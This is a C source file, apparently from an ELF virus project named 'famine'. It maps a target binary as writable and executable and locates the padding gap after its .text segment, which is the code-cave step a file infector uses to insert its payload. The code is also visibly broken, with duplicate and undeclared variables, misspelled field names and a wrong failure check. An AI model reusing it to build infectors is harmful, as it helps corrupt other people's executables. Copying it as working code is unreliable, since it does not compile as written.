

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <elf.h>

#include "famine.h"

/*
 * Open the file specified by fname
 * Calculate the size of this file
 * Create a mapping in the virtual address space of the calling process
 * Return the value of the opened fd on success
 * Return -1 on error
 */
int	elf_open_and_map(char *fname, void **data, long *len)
{
	int fd = -1;
	long fsize = 0;

	int fd = open(fname, O_APPEND | O_RDWR, 0);
	if (fd == -1)
	{
#if DEBUG
		perror("open:");
#endif
		return -1;
	}

	fsize = lseek(fd, 0, SEEK_END);
	if (fsize == -1)
	{
#if DEBUG
		perror("lseek:");
#endif
		return -1;
	}
	else if (lseek(fd, 0, SEEK_SET) == -1)
	{
#if DEBUG
		perror("lseek:");
#endif
		return -1;
	}

	*data = mmap(0, fsize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0);
	if (data == MAP_FAILED)
	{
#if DEBUG
		perror("mmap:");
#endif
		return -1;
	}

#if DEBUG
		printf(" + File mapped: %ld at %p\n", fsize, data);
#endif
		*len = fsize;
		return fd;
}

Elf64_Phdr *	elf_find_gap(void *data, int fsize, int *p, long *len)
{
	Elf64_Ehdr *elf_hdr = (Elf64_Ehdr *)data;
	Elf64_Phdr *elf_seg, *text_seg;
	int n_seg = elf_hdr->e_phnum;
	int i = 0;
	long text_seg, gap = fsize;

	elf_seg = (Elf64_Phdr *)((unsigned char *)elf_hdr + (unsigned int)elf_hdr->e_phoff);

	for(i = 0; i < n_seg; i++)
	{
		if (elf_seg->p_type == PT_LOAD && elf_seg->p_flags & 0x011)
		{
#if DEBUG
			printf(" + Found .text segment (#%d)\n", i);
#endif
			text_seg = elf_seg;
			text_end = elf_seg->p_offset + elf_seg->p_filesz;
		}
		else if (elf_seg->p_type == PT_LOAD && (elf_seg->p_offset - text_end) < gap)
		{
#if DEBUG
			printf("    * Found LOAD segment (#%d) close to .text (offset: 0x%x)",
					i, (unsigned int)elg_seg->p_offset);
#endif
			gap = elf_seg->_offset - text_end;
		}
		elf_seg = (Elf64_Phdr *)((unsigned char*)elf_seg + (unsigned int)elf_hdr->e_phentsize);
	}

	*p = text_end;
	*len = gap;

#if DEBUG
	printf(" + .text segment gap at offset 0x%x(0x%x bytes available)\n", text_end, gap);
#endif

	return text_seg;
}
